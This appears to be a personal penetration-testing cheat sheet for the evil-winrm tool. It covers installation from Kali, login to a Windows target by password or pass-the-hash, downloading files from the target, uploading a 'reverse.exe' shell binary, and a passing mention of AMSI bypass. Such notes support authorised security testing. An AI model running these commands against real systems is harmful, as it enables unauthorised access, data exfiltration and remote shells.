---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
#### Steps

```bash - kali
sudo gem install winrm winrm-fs colorize stringio
```

```bash - kali
cd /opt && sudo git clone https://github.com/Hackplayers/evil-winrm.git && cd -
```

Login with either password or Hash.
```bash - kali
ruby /opt/evil-winrm/evil-winrm.rb -i $TARGET -u $USER -p '$PASSWORD'
```

```bash - kali
ruby /opt/evil-winrm/evil-winrm.rb -i $TARGET -u $USER -H '$HASH'
```

Bypass AMSI, used to run PowerShell scripts.

#### Downloading files - ==MUST USE FULL PATHS==
```powershell - windows
download C:\Troubleshooting\powershell-logs.csv /home/kali/Desktop/powershell-log
```

#### Uploading files - ==MUST USE FULL PATHS==
```powershell - windows
upload /home/kali/Desktop/reverse.exe C:\Troubleshooting\reverse.exe
```

SEE ALSO:
[[3._EvilWinRM]]


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
